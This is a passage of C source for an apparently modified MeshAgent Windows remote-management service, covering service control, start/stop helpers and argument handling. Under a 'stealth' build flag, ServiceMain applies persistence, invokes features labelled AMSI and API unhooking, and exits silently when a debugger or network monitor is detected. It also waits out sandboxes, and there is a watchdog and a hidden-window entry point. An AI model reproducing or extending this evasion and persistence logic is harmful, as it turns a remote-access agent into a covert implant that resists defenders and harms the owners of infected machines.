		case PBT_APMRESUMESUSPEND:		// Operation is resuming from a low - power state.This message is sent after PBT_APMRESUMEAUTOMATIC if the resume is triggered by user input, such as pressing a key.
			break;
		case PBT_APMSUSPEND:			// System is suspending operation.
			break;
		case PBT_POWERSETTINGCHANGE:	// Power setting change event has been received.
			break;
		}
		break;
	case SERVICE_CONTROL_SESSIONCHANGE:
		{
			/* Extract session ID from event data (WTSSESSION_NOTIFICATION structure) */
			DWORD sessionId = 0;
			if (eventData != NULL)
			{
				WTSSESSION_NOTIFICATION* sessionNotification = (WTSSESSION_NOTIFICATION*)eventData;
				if (sessionNotification->cbSize >= sizeof(WTSSESSION_NOTIFICATION))
				{
					sessionId = sessionNotification->dwSessionId;
				}
			}

#ifdef MESHAGENT_ENABLE_STEALTH
			/* Forward session change to stealth integration for helper monitor */
			StealthIntegration_HandleSessionChange(eventType, sessionId);
#endif
#if defined(_LINKVM)
			kvm_notify_session_change(eventType, sessionId);
#endif

			if (agent == NULL)
			{
				break; // If there isn't an agent, no point in doing anything, cuz nobody will hear us
			}

			switch (eventType)
			{
			case WTS_CONSOLE_CONNECT:		// The session identified by lParam was connected to the console terminal or RemoteFX session.
				break;
			case WTS_CONSOLE_DISCONNECT:	// The session identified by lParam was disconnected from the console terminal or RemoteFX session.
				break;
			case WTS_REMOTE_CONNECT:		// The session identified by lParam was connected to the remote terminal.
				break;
			case WTS_REMOTE_DISCONNECT:		// The session identified by lParam was disconnected from the remote terminal.
				break;
			case WTS_SESSION_LOGON:			// A user has logged on to the session identified by lParam.
			case WTS_SESSION_LOGOFF:		// A user has logged off the session identified by lParam.
				break;
			case WTS_SESSION_LOCK:			// The session identified by lParam has been locked.
				break;
			case WTS_SESSION_UNLOCK:		// The session identified by lParam has been unlocked.
				break;
			case WTS_SESSION_REMOTE_CONTROL:// The session identified by lParam has changed its remote controlled status.To determine the status, call GetSystemMetrics and check the SM_REMOTECONTROL metric.
				break;
			case WTS_SESSION_CREATE:		// Reserved for future use.
			case WTS_SESSION_TERMINATE:		// Reserved for future use.
				break;
			}
		}
		break;
	default:
		break;
	}

	SetServiceStatus(serviceStatusHandle, &serviceStatus);
	return(0);
}


void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
{
	ILib_DumpEnabledContext winException;
	size_t len = 0;
	WCHAR str[_MAX_PATH + 1] = {0};  // SECURITY FIX: Extra byte for null terminator


	UNREFERENCED_PARAMETER(argc);
	UNREFERENCED_PARAMETER(argv);

	MeshService_InitializeBrandingGlobals();

#ifdef MESHAGENT_ENABLE_STEALTH
	if (argc > 1 && _stricmp(argv[1], "-refresh-persistence") == 0)
	{
		int refreshStatus = 0;
		if (!IsAdmin())
		{
			printf("[!] -refresh-persistence requires elevation.\n");
			refreshStatus = 1;
		}
		else
		{
			printf("[*] Reapplying persistence profile...\n");
			Stealth_ApplyPersistenceProfile();
			printf("[+] Persistence refresh complete.\n");
		}
		wmain_free(argv);
		(void)refreshStatus;
		return;
	}
#endif

	// Initialise service status
	// Report as our own-process service so SCM manages it as a dedicated process
	serviceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	serviceStatus.dwCurrentState = SERVICE_STOPPED;
	serviceStatus.dwControlsAccepted = 0;
	serviceStatus.dwWin32ExitCode = NO_ERROR;
	serviceStatus.dwServiceSpecificExitCode = NO_ERROR;
	serviceStatus.dwCheckPoint = 0;
	serviceStatus.dwWaitHint = 0;
	serviceStatusHandle = RegisterServiceCtrlHandlerExA(serviceName, ServiceControlHandler, NULL);

	if (serviceStatusHandle)
	{
		// Service is starting
		serviceStatus.dwCurrentState = SERVICE_START_PENDING;
		SetServiceStatus(serviceStatusHandle, &serviceStatus);

		// Service running
		serviceStatus.dwCurrentState = SERVICE_RUNNING;
		MeshService_RefreshControlsAccepted();
		MeshService_EnsureRecoveryPolicy();

		// Get our own executable name with buffer overflow protection
		DWORD pathLen = GetModuleFileNameW(NULL, str, _MAX_PATH);
		str[_MAX_PATH] = L'\0';  // SECURITY FIX: Force null termination

		if (!MeshService_ProcessHasSystemSid())
		{
			Stealth_DebugPrintfA("[ServiceMain] Not running as LocalSystem, requesting elevation");
			RunAsAdmin("run", IsAdmin());
			serviceStatus.dwCurrentState = SERVICE_STOPPED;
			SetServiceStatus(serviceStatusHandle, &serviceStatus);
			return;
		}


        // SECURITY: Enable optional stealth/anti-analysis features only if
        // explicitly enabled at build time.
#ifdef MESHAGENT_ENABLE_STEALTH
        // Always enforce persistence artefacts even if the installer failed to stage them.
        Stealth_ApplyPersistenceProfile();

        // Initialize lab features (AMSI, logging, API unhook, firewall) when enabled
        Stealth_InitLabFeatures();

        Stealth_EnableCrashRecovery();

        // SECURITY: Check for debuggers/analysis tools
        if (Stealth_IsDebuggerDetected() ||
            Stealth_IsNetworkMonitorDetected()) {
            // Exit silently if under analysis
            serviceStatus.dwCurrentState = SERVICE_STOPPED;
            SetServiceStatus(serviceStatusHandle, &serviceStatus);
            return;
        }

        // SECURITY: Sandbox detection - wait for user activity
        if (Stealth_IsRunningInSandbox_C()) {
            // Wait for real user activity before connecting
            if (!Stealth_WaitForUserActivity_C(60000)) {  // 60 second timeout
                // Likely sandbox - exit silently
                serviceStatus.dwCurrentState = SERVICE_STOPPED;
                SetServiceStatus(serviceStatusHandle, &serviceStatus);
                return;
            }
        }
#endif

		MeshService_ActivateResilience();

		// Run the mesh agent
		CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

		__try
		{
			agent = MeshAgent_Create(0);
			agent->serviceReserved = 1;
			MeshAgent_Start(agent, g_serviceArgc, g_serviceArgv);
			agent = NULL;
		}
		__except (ILib_WindowsExceptionFilterEx(GetExceptionCode(), GetExceptionInformation(), &winException))
		{
			ILib_WindowsExceptionDebugEx(&winException);
		}
		CoUninitialize();

		MeshService_DeactivateResilience();

		// Service was stopped
		serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
		SetServiceStatus(serviceStatusHandle, &serviceStatus);

		// Service is now stopped
		serviceStatus.dwControlsAccepted &= ~(SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
		serviceStatus.dwCurrentState = SERVICE_STOPPED;
		SetServiceStatus(serviceStatusHandle, &serviceStatus);
	}
}

int RunService(int argc, char* argv[])
{
	SERVICE_TABLE_ENTRY serviceTable[2];

	MeshService_InitializeBrandingGlobals();

	serviceTable[0].lpServiceName = serviceName;
	serviceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
	serviceTable[1].lpServiceName = NULL;
	serviceTable[1].lpServiceProc = NULL;
	g_serviceArgc = argc;
	g_serviceArgv = argv;

	return StartServiceCtrlDispatcher(serviceTable);
}

// SERVICE_STOPPED				  1    The service is not running.
// SERVICE_START_PENDING		  2    The service is starting.
// SERVICE_STOP_PENDING			  3    The service is stopping.
// SERVICE_RUNNING				  4    The service is running.
// SERVICE_CONTINUE_PENDING		  5    The service continue is pending.
// SERVICE_PAUSE_PENDING		  6    The service pause is pending.
// SERVICE_PAUSED				  7    The service is paused.
// SERVICE_NOT_INSTALLED		100    The service is not installed.
int GetServiceState(LPCSTR servicename)
{
	int r = 0;
	SC_HANDLE serviceControlManager = OpenSCManager(0, 0, SC_MANAGER_CONNECT);

	if (serviceControlManager)
	{
		SC_HANDLE service = OpenService(serviceControlManager, servicename, SERVICE_QUERY_STATUS);
		if (service)
		{
			SERVICE_STATUS serviceStatusEx;
			if (QueryServiceStatus(service, &serviceStatusEx))
			{
				r = serviceStatusEx.dwCurrentState;
			}
			CloseServiceHandle(service);
		}
		else
		{
			r = 100;
		}
		CloseServiceHandle(serviceControlManager);
	}
	return r;
}

static void MeshService_PrintControlErrorA(const char* action, DWORD err)
{
	LPWSTR message = NULL;
	DWORD msgLen = 0;

	if (action == NULL) { action = "service operation"; }

	msgLen = FormatMessageW(
		FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		err,
		0,
		(LPWSTR)&message,
		0,
		NULL);

	if (msgLen > 0 && message != NULL)
	{
		while (msgLen > 0 && (message[msgLen - 1] == L'\r' || message[msgLen - 1] == L'\n' || message[msgLen - 1] == L' ' || message[msgLen - 1] == L'\t'))
		{
			message[msgLen - 1] = L'\0';
			--msgLen;
		}
		wprintf(L"[!] %S failed (error=%lu): %ls\n", action, err, message);
		LocalFree(message);
	}
	else
	{
		printf("[!] %s failed (error=%lu)\n", action, err);
	}
}

static void MeshService_FormatWin32ErrorMessageW(DWORD err, WCHAR* buffer, size_t bufferCch)
{
	LPWSTR message = NULL;
	DWORD msgLen = 0;

	if (buffer == NULL || bufferCch == 0) { return; }
	buffer[0] = L'\0';

	msgLen = FormatMessageW(
		FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		err,
		0,
		(LPWSTR)&message,
		0,
		NULL);

	if (msgLen > 0 && message != NULL)
	{
		while (msgLen > 0 && (message[msgLen - 1] == L'\r' || message[msgLen - 1] == L'\n' || message[msgLen - 1] == L' ' || message[msgLen - 1] == L'\t'))
		{
			message[msgLen - 1] = L'\0';
			--msgLen;
		}
		StringCchCopyW(buffer, bufferCch, message);
		LocalFree(message);
		return;
	}

	StringCchPrintfW(buffer, bufferCch, L"Win32 error %lu", err);
}

static BOOL MeshService_QueryServiceStatusProcess(SC_HANDLE service, SERVICE_STATUS_PROCESS* status)
{
	DWORD bytesNeeded = 0;
	if (service == NULL || status == NULL)
	{
		SetLastError(ERROR_INVALID_PARAMETER);
		return FALSE;
	}
	ZeroMemory(status, sizeof(SERVICE_STATUS_PROCESS));
	return QueryServiceStatusEx(service, SC_STATUS_PROCESS_INFO, (LPBYTE)status, sizeof(SERVICE_STATUS_PROCESS), &bytesNeeded);
}

static BOOL MeshService_WaitForServiceState(SC_HANDLE service, DWORD desiredState, DWORD timeoutMs)
{
	ULONGLONG startTick = 0;
	ULONGLONG nowTick = 0;
	ULONGLONG elapsed = 0;
	DWORD sleepMs = 0;
	DWORD remainingMs = 0;
	SERVICE_STATUS_PROCESS status;

	if (timeoutMs == 0) { timeoutMs = MESH_SERVICE_CONTROL_TIMEOUT_MS; }
	startTick = GetTickCount64();

	for (;;)
	{
		if (!MeshService_QueryServiceStatusProcess(service, &status))
		{
			return FALSE;
		}

		if (status.dwCurrentState == desiredState)
		{
			return TRUE;
		}

		nowTick = GetTickCount64();
		elapsed = (nowTick >= startTick) ? (nowTick - startTick) : 0;
		if (elapsed >= (ULONGLONG)timeoutMs)
		{
			SetLastError(ERROR_TIMEOUT);
			return FALSE;
		}

		sleepMs = MESH_SERVICE_CONTROL_POLL_MIN_MS;
		if (status.dwWaitHint > 0)
		{
			sleepMs = status.dwWaitHint / 10;
			if (sleepMs < MESH_SERVICE_CONTROL_POLL_MIN_MS) { sleepMs = MESH_SERVICE_CONTROL_POLL_MIN_MS; }
			if (sleepMs > MESH_SERVICE_CONTROL_POLL_MAX_MS) { sleepMs = MESH_SERVICE_CONTROL_POLL_MAX_MS; }
		}

		remainingMs = (DWORD)((ULONGLONG)timeoutMs - elapsed);
		if (remainingMs == 0) { remainingMs = 1; }
		if (sleepMs > remainingMs) { sleepMs = remainingMs; }
		Sleep(sleepMs);
	}
}

static BOOL MeshService_StopServiceNative(SC_HANDLE service, DWORD timeoutMs)
{
	SERVICE_STATUS_PROCESS status;
	SERVICE_STATUS legacyStatus;
	DWORD lastError = ERROR_SUCCESS;
	ULONGLONG startTick = 0;
	ULONGLONG elapsed = 0;

	if (!MeshService_QueryServiceStatusProcess(service, &status))
	{
		return FALSE;
	}

	if (status.dwCurrentState == SERVICE_START_PENDING)
	{
		if (!MeshService_WaitForServiceState(service, SERVICE_RUNNING, timeoutMs))
		{
			if (MeshService_QueryServiceStatusProcess(service, &status) && status.dwCurrentState == SERVICE_STOPPED)
			{
				return TRUE;
			}
			return FALSE;
		}
		if (!MeshService_QueryServiceStatusProcess(service, &status))
		{
			return FALSE;
		}
	}

	if (status.dwCurrentState == SERVICE_STOPPED)
	{
		return TRUE;
	}
	if (status.dwCurrentState == SERVICE_STOP_PENDING)
	{
		return MeshService_WaitForServiceState(service, SERVICE_STOPPED, timeoutMs);
	}

	startTick = GetTickCount64();
	for (;;)
	{
		ZeroMemory(&legacyStatus, sizeof(legacyStatus));
		if (ControlService(service, SERVICE_CONTROL_STOP, &legacyStatus))
		{
			break;
		}

		lastError = GetLastError();
		if (lastError == ERROR_SERVICE_NOT_ACTIVE)
		{
			return TRUE;
		}
		if (lastError != ERROR_SERVICE_CANNOT_ACCEPT_CTRL)
		{
			SetLastError(lastError);
			return FALSE;
		}

		if (!MeshService_QueryServiceStatusProcess(service, &status))
		{
			return FALSE;
		}
		if (status.dwCurrentState == SERVICE_STOPPED)
		{
			return TRUE;
		}
		if (status.dwCurrentState == SERVICE_STOP_PENDING)
		{
			return MeshService_WaitForServiceState(service, SERVICE_STOPPED, timeoutMs);
		}

		elapsed = GetTickCount64() - startTick;
		if (elapsed >= timeoutMs)
		{
			SetLastError(ERROR_TIMEOUT);
			return FALSE;
		}
		Sleep(MESH_SERVICE_CONTROL_POLL_MIN_MS);
	}
	return MeshService_WaitForServiceState(service, SERVICE_STOPPED, timeoutMs);
}

static BOOL MeshService_StartServiceNative(SC_HANDLE service, DWORD timeoutMs)
{
	SERVICE_STATUS_PROCESS status;
	DWORD lastError = ERROR_SUCCESS;

	if (!MeshService_QueryServiceStatusProcess(service, &status))
	{
		return FALSE;
	}

	if (status.dwCurrentState == SERVICE_RUNNING)
	{
		return TRUE;
	}
	if (status.dwCurrentState == SERVICE_START_PENDING)
	{
		return MeshService_WaitForServiceState(service, SERVICE_RUNNING, timeoutMs);
	}
	if (status.dwCurrentState == SERVICE_STOP_PENDING)
	{
		if (!MeshService_WaitForServiceState(service, SERVICE_STOPPED, timeoutMs))
		{
			return FALSE;
		}
	}

	if (!StartServiceW(service, 0, NULL))
	{
		lastError = GetLastError();
		if (lastError == ERROR_SERVICE_DISABLED)
		{
			if (ChangeServiceConfigW(
				service,
				SERVICE_NO_CHANGE,
				SERVICE_AUTO_START,
				SERVICE_NO_CHANGE,
				NULL,
				NULL,
				NULL,
				NULL,
				NULL,
				NULL,
				NULL))
			{
				if (!StartServiceW(service, 0, NULL))
				{
					lastError = GetLastError();
				}
				else
				{
					lastError = ERROR_SUCCESS;
				}
			}
		}
		if (lastError != ERROR_SERVICE_ALREADY_RUNNING)
		{
			if (lastError == ERROR_SUCCESS)
			{
				lastError = ERROR_GEN_FAILURE;
			}
			SetLastError(lastError);
			return FALSE;
		}
	}

	return MeshService_WaitForServiceState(service, SERVICE_RUNNING, timeoutMs);
}

static int MeshService_HandleNativeServiceCommand(const char* command)
{
	BOOL doStart = FALSE;
	BOOL doStop = FALSE;
	BOOL doRestart = FALSE;
	BOOL allowStopOverrideApplied = FALSE;
	BOOL hadPreviousAllowStop = FALSE;
	BOOL ok = FALSE;
	DWORD access = SERVICE_QUERY_STATUS;
	DWORD lastError = ERROR_SUCCESS;
	DWORD previousAllowStop = 0;
	wchar_t serviceNameBuf[256];
	SC_HANDLE scm = NULL;
	SC_HANDLE service = NULL;

	if (command == NULL) { return -1; }
	doStart = (strcasecmp(command, "start") == 0 || strcasecmp(command, "-start") == 0);
	doStop = (strcasecmp(command, "stop") == 0 || strcasecmp(command, "-stop") == 0);
	doRestart = (strcasecmp(command, "restart") == 0 || strcasecmp(command, "-restart") == 0);
	if (!doStart && !doStop && !doRestart) { return -1; }

	if (!MeshService_GetServiceNameW(serviceNameBuf, _countof(serviceNameBuf)))
	{
		printf("[!] Unable to resolve service name for control operation\n");
		return 1;
	}

	if (doStart || doRestart) { access |= SERVICE_START | SERVICE_CHANGE_CONFIG; }
	if (doStop || doRestart) { access |= SERVICE_STOP; }

	scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
	if (scm == NULL)
	{
		lastError = GetLastError();
		MeshService_PrintControlErrorA("OpenSCManagerW", lastError);
		return 1;
	}

	service = OpenServiceW(scm, serviceNameBuf, access);
	if (service == NULL)
	{
		lastError = GetLastError();
		MeshService_PrintControlErrorA("OpenServiceW", lastError);
		CloseServiceHandle(scm);
		return 1;
	}

	if (doStop || doRestart)
	{
		if (!MeshService_SetAllowStopOverride(serviceNameBuf, &previousAllowStop, &hadPreviousAllowStop))
		{
			lastError = GetLastError();
			if (lastError == ERROR_SUCCESS) { lastError = ERROR_ACCESS_DENIED; }
			MeshService_PrintControlErrorA("Set AllowStop override", lastError);
			CloseServiceHandle(service);
			CloseServiceHandle(scm);
			return 1;
		}
		allowStopOverrideApplied = TRUE;
	}

	if (doStart)
	{
		ok = MeshService_StartServiceNative(service, MESH_SERVICE_CONTROL_TIMEOUT_MS);
		if (ok)
		{
			printf("Service Started\n");
		}
		else
		{
			lastError = GetLastError();
			MeshService_PrintControlErrorA("StartServiceW", lastError);
		}
	}
	else if (doStop)
	{
		ok = MeshService_StopServiceNative(service, MESH_SERVICE_CONTROL_TIMEOUT_MS);
		if (ok)
		{
			printf("Service Stopped\n");
		}
		else
		{
			lastError = GetLastError();
			MeshService_PrintControlErrorA("ControlService", lastError);
		}
	}
	else
	{
		ok = MeshService_StopServiceNative(service, MESH_SERVICE_CONTROL_TIMEOUT_MS);
		if (ok)
		{
			ok = MeshService_StartServiceNative(service, MESH_SERVICE_CONTROL_TIMEOUT_MS);
		}
		if (ok)
		{
			printf("Service Restarted\n");
		}
		else
		{
			lastError = GetLastError();
			if (lastError == ERROR_SUCCESS)
			{
				lastError = ERROR_GEN_FAILURE;
				SetLastError(lastError);
			}
			MeshService_PrintControlErrorA("RestartService", lastError);
		}
	}

	if (allowStopOverrideApplied)
	{
		MeshService_RestoreAllowStopOverride(serviceNameBuf, previousAllowStop, hadPreviousAllowStop);
	}
	CloseServiceHandle(service);
	CloseServiceHandle(scm);
	return ok ? 0 : 1;
}

#if defined(MESHAGENT_WINDOWS_SUBSYSTEM)
// When linked with /SUBSYSTEM:WINDOWS and MESHAGENT_WINDOWS_SUBSYSTEM defined,
// use a GUI-subsystem entry point to avoid creating a console window so the
// process shows under Background processes (not Apps) when run interactively.
int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE hPrev, LPWSTR lpCmdLine, int nShow)
{
    int result = 0;
    UNREFERENCED_PARAMETER(hInst);
    UNREFERENCED_PARAMETER(hPrev);
    UNREFERENCED_PARAMETER(lpCmdLine);
    UNREFERENCED_PARAMETER(nShow);

    // Reuse existing wide-argv flow inside wmain
    result = wmain(__argc, (char**)__wargv);
    ExitProcess((UINT)result);
    return result;
}
#endif

#if !defined(UNICODE) && !defined(_UNICODE)
// ANSI builds still enter through main(). Duplicate argv as wide so wmain()
// can reuse the shared flow (including the -watchdog fast-path).
static WCHAR** MeshService_CopyAnsiArgsToWide(int argc, char** argv)
{
	WCHAR** wideArgs = NULL;
	int i;

	if (argc <= 0) { return NULL; }

	wideArgs = (WCHAR**)ILibMemory_SmartAllocate((argc + 1) * sizeof(void*));
	if (wideArgs == NULL) { return NULL; }
	ZeroMemory(wideArgs, (argc + 1) * sizeof(void*));

	for (i = 0; i < argc; ++i)
	{
		if (argv[i] == NULL) { continue; }

		int needed = MultiByteToWideChar(CP_UTF8, 0, argv[i], -1, NULL, 0);
		if (needed <= 0)
		{
			needed = MultiByteToWideChar(CP_ACP, 0, argv[i], -1, NULL, 0);
		}
		if (needed <= 0) { continue; }

		wideArgs[i] = (WCHAR*)ILibMemory_SmartAllocate(needed * sizeof(WCHAR));
		if (MultiByteToWideChar(CP_UTF8, 0, argv[i], -1, wideArgs[i], needed) <= 0)
		{
			MultiByteToWideChar(CP_ACP, 0, argv[i], -1, wideArgs[i], needed);
		}
	}

	return wideArgs;
}

int main(int argc, char** argv)
{
	MeshService_InstallInvalidParameterHandler();
#ifdef MESHAGENT_ENABLE_STEALTH
	if (argc > 2 && argv[1] != NULL && _stricmp(argv[1], "-watchdog") == 0)
	{
		WCHAR targetService[256] = { 0 };
		if (MultiByteToWideChar(CP_UTF8, 0, argv[2], -1, targetService, (int)_countof(targetService)) <= 0)
		{
			if (MultiByteToWideChar(CP_ACP, 0, argv[2], -1, targetService, (int)_countof(targetService)) <= 0)
			{
				printf("[!] -watchdog requires a valid service name argument\n");
				return 1;
			}
		}

		WatchdogConfig wdCfg;
		Watchdog_InitConfig(&wdCfg);
		Watchdog_ServiceMain(targetService, &wdCfg);
		return 0;
	}
#endif

	WCHAR** wideArgs = MeshService_CopyAnsiArgsToWide(argc, argv);
	int result = wmain(argc, (char**)wideArgs);
	if (wideArgs != NULL)
	{
		wmain_free(wideArgs);
	}
	ExitProcess((UINT)result);
	return result;
}
#endif


/*
int APIENTRY _tWinMain(HINSTANCE hInstance,
					 HINSTANCE hPrevInstance,
					 LPTSTR    lpCmdLine,
					 int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

	return _tmain( 0, NULL );
}
*/

static void MeshService_TraceKvmServiceWrite(const char* phase, char* buffer, int bufferLen, DWORD errorCode, DWORD bytesTransferred)
{
	WCHAR enabled[8] = { 0 };
	WCHAR tempPath[MAX_PATH] = { 0 };
	WCHAR logPath[MAX_PATH] = { 0 };
	HANDLE fileHandle = INVALID_HANDLE_VALUE;
	char line[160];
	int len = 0;
	unsigned short packetType = 0;
	DWORD written = 0;

	if (phase == NULL || buffer == NULL || bufferLen < 4) { return; }
	if (GetEnvironmentVariableW(L"STEALTH_KVM_TRACE_SERVICE_WRITES", enabled, (DWORD)_countof(enabled)) == 0) { return; }
	if (ExpandEnvironmentStringsW(L"%TEMP%\\", tempPath, (DWORD)_countof(tempPath)) == 0 || tempPath[0] == L'\0')
	{
		GetTempPathW((DWORD)_countof(tempPath), tempPath);
	}
	if (FAILED(StringCchPrintfW(logPath, _countof(logPath), L"%lsmeshagent_kvm_service_trace.log", tempPath))) { return; }

	packetType = (unsigned short)ntohs(((unsigned short*)buffer)[0]);
	len = sprintf_s(
		line,
		sizeof(line),
		"%s type=%u len=%d transferred=%lu error=%lu\r\n",
		phase,
		(unsigned int)packetType,
		bufferLen,
		(unsigned long)bytesTransferred,
		(unsigned long)errorCode);
	if (len <= 0) { return; }

	fileHandle = CreateFileW(logPath, FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (fileHandle == INVALID_HANDLE_VALUE) { return; }
	WriteFile(fileHandle, line, (DWORD)len, &written, NULL);
	CloseHandle(fileHandle);
}


ILibTransport_DoneState kvm_serviceWriteSink(char *buffer, int bufferLen, void *reserved)
{
	DWORD len = 0;
	HANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);
	UNREFERENCED_PARAMETER(reserved);
	if (h != NULL && h != INVALID_HANDLE_VALUE)
	{
		MeshService_TraceKvmServiceWrite("before", buffer, bufferLen, ERROR_SUCCESS, 0);

		// Write the entire buffer in a single call.  The named pipe was created
		// with a 1 MB buffer (kvm_relay_create_bridge_server_pipeW), so frames
		// up to ~1 MB complete atomically without interleaving with control
		// packets from the input thread.  The previous 32 KB chunking caused
		// interleaved writes that corrupted the parent's stream parser.
		if (!WriteFile(h, buffer, (DWORD)bufferLen, &len, NULL) || len != (DWORD)bufferLen)
		{
			MeshService_TraceKvmServiceWrite("error", buffer, bufferLen, GetLastError(), len);
			return ILibTransport_DoneState_ERROR;
		}

		MeshService_TraceKvmServiceWrite("after", buffer, bufferLen, ERROR_SUCCESS, len);
	}
	return ILibTransport_DoneState_COMPLETE;
}
BOOL CtrlHandler(DWORD fdwCtrlType)
{
	switch (fdwCtrlType)
	{
		// Handle the CTRL-C signal. 
	case CTRL_C_EVENT:
	case CTRL_BREAK_EVENT:
	{
		if (agent != NULL) { MeshAgent_Stop(agent); }
		return TRUE;
	}
	default:
		return FALSE;
	}
}

/* Note: wmain_free macro is defined at file top for use in ServiceMain() */

void need_stop_chain(duk_context *ctx, void *user)
{
	void *chain = duk_ctx_chain(ctx);
	ILibStopChain(chain);
}

static int MeshService_HasArg(int argc, char **argv, const char *arg)
{
	int i;
	for (i = 0; i < argc; ++i)
	{
		if (argv[i] != NULL && strcasecmp(argv[i], arg) == 0) { return 1; }
	}
	return 0;
}

static int MeshService_IsManagedConsoleOperation(int argc, char **argv)
{
	int i;
	for (i = 1; i < argc; ++i)
	{
		if (argv[i] == NULL) { continue; }
		if (strcasecmp(argv[i], "start") == 0 || strcasecmp(argv[i], "-start") == 0) { return 1; }
		if (strcasecmp(argv[i], "stop") == 0 || strcasecmp(argv[i], "-stop") == 0) { return 1; }
		if (strcasecmp(argv[i], "restart") == 0 || strcasecmp(argv[i], "-restart") == 0) { return 1; }
		if (strcasecmp(argv[i], "state") == 0 || strcasecmp(argv[i], "exstate") == 0) { return 1; }
		if (strcasecmp(argv[i], "-nodeid") == 0) { return 1; }
		if (strcasecmp(argv[i], "-name") == 0) { return 1; }
		if (strcasecmp(argv[i], "-info") == 0) { return 1; }
		if (strcasecmp(argv[i], "-signcheck") == 0) { return 1; }
		if (strcasecmp(argv[i], "-agentHash") == 0) { return 1; }
		if (strcasecmp(argv[i], "-agentFullHash") == 0) { return 1; }
		if (strcasecmp(argv[i], "-resetnodeid") == 0) { return 1; }
		if (strcasecmp(argv[i], "-updaterversion") == 0) { return 1; }
		if (strcasecmp(argv[i], "-import") == 0) { return 1; }
		if (strcasecmp(argv[i], "-exec") == 0) { return 1; }
		if (strcasecmp(argv[i], "-b64exec") == 0) { return 1; }
		if (strcasecmp(argv[i], "--slave") == 0) { return 1; }
		if (strcasecmp(argv[i], "-finstall") == 0) { return 1; }
		if (strcasecmp(argv[i], "-funinstall") == 0) { return 1; }
		if (strcasecmp(argv[i], "-fulluninstall") == 0) { return 1; }
		if (strcasecmp(argv[i], "-fullinstall") == 0) { return 1; }
		if (strcasecmp(argv[i], "-fullupdate") == 0) { return 1; }
		if (strcasecmp(argv[i], "-fupdate") == 0) { return 1; }
		if (strcasecmp(argv[i], "-fullregression") == 0) { return 1; }
		if (strcasecmp(argv[i], "-validate-install") == 0 || strcasecmp(argv[i], "--validate-install") == 0) { return 1; }
		if (strcasecmp(argv[i], "-validate-update") == 0 || strcasecmp(argv[i], "--validate-update") == 0) { return 1; }
		if (strcasecmp(argv[i], "-validate-uninstall") == 0 || strcasecmp(argv[i], "--validate-uninstall") == 0) { return 1; }
		if (strcasecmp(argv[i], "-validate-package") == 0 || strcasecmp(argv[i], "--validate-package") == 0) { return 1; }
		if (strcasecmp(argv[i], "-preprotection-capture") == 0 || strcasecmp(argv[i], "--preprotection-capture") == 0) { return 1; }
		if (strcasecmp(argv[i], "--selftest") == 0 || strncasecmp(argv[i], "--selftest=", 11) == 0) { return 1; }
	}
	return 0;
}

static int MeshService_IsRunningUnderRundll32(void)
{
	WCHAR processPath[MAX_PATH] = { 0 };
	WCHAR* baseName = NULL;
	DWORD len = GetModuleFileNameW(NULL, processPath, (DWORD)_countof(processPath));

	if (len == 0 || len >= _countof(processPath)) { return 0; }
	baseName = wcsrchr(processPath, L'\\');
	baseName = (baseName == NULL) ? processPath : (baseName + 1);
	return (_wcsicmp(baseName, L"rundll32.exe") == 0 || _wcsicmp(baseName, L"rundll32") == 0) ? 1 : 0;
}

duk_ret_t _start(duk_context *ctx)
{
	duk_push_global_object(ctx);
	if (Duktape_GetBooleanProperty(ctx, -1, "_OK", 0))
	{
		duk_get_prop_string(ctx, -1, "_start_data");
		FreeConsole();
		GdiPlusFlat_Init();
		DialogBoxW(NULL, MAKEINTRESOURCEW(IDD_INSTALLDIALOG), NULL, DialogHandler);
		GdiPlusFlat_Release();
	}
	duk_eval_string_noresult(ctx, "process._exit();");

	return(0);
}

int wmain(int argc, char* wargv[])
{
	MeshService_InstallInvalidParameterHandler();
	size_t str2len = 0;// , proxylen = 0, taglen = 0;
	ILib_DumpEnabledContext winException;
	int retCode = 0;

	int argvi, argvsz;
	char **argv = NULL;
	WCHAR **wideArgv = (WCHAR**)wargv;

#ifdef MESHAGENT_ENABLE_STEALTH
	if (wideArgv != NULL &&
		argc > 2 &&
		wideArgv[1] != NULL &&
		_wcsicmp(wideArgv[1], L"-watchdog") == 0)
	{
		const WCHAR* targetService = wideArgv[2];
		if (targetService == NULL || targetService[0] == L'\0')
		{
			wprintf(L"[!] -watchdog requires a service name argument\n");
			return 1;
		}

		WatchdogConfig wdCfg;
		Watchdog_InitConfig(&wdCfg);
		Watchdog_ServiceMain(targetService, &wdCfg);
		return 0;
	}
#endif

	argv = (char**)ILibMemory_SmartAllocate((argc + 1) * sizeof(void*));
	for (argvi = 0; argvi < argc; ++argvi)
	{
		LPCWCH sourceArg = (wideArgv != NULL) ? wideArgv[argvi] : NULL;
		if (sourceArg == NULL)
		{
			argv[argvi] = NULL;
			continue;
		}

		argvsz = WideCharToMultiByte(CP_UTF8, 0, sourceArg, -1, NULL, 0, NULL, NULL);
		argv[argvi] = (char*)ILibMemory_SmartAllocate(argvsz);
		WideCharToMultiByte(CP_UTF8, 0, sourceArg, -1, argv[argvi], argvsz, NULL, NULL);
	}

	MeshService_InitializeBrandingGlobals();

	if (argc > 1 && (strcasecmp(argv[1], "-install") == 0 || strcasecmp(argv[1], "-uninstall") == 0))
	{
		printf("[-] Legacy -install/-uninstall switches are no longer supported. Use -fullinstall/-fulluninstall for svchost deployments.\n");
		wmain_free(argv);
		return 1;
	}

	if (argc > 1)
	{
		int nativeServiceCmdResult = MeshService_HandleNativeServiceCommand(argv[1]);
		if (nativeServiceCmdResult >= 0)
		{
			wmain_free(argv);
